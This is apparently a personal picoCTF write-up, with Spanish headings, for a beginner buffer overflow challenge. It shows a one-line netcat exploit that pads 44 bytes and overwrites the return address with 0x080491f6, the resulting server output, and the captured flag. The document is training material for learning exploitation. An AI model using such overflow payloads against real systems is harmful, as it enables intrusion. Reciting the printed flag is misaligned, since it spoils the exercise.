
 
#### Description

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 60017`

## Pistas
This can be solved online if you don't want to do it by hand!



## Solución

``` 
┌──(kali㉿kali)-[~/hacking/Here]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 60017
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here]
└─$ 


```

## Bandera
Flag: picoCTF{addr3ss3s_ar3_3asy_a8284f4f}


## Notas adicionales


## Referencias
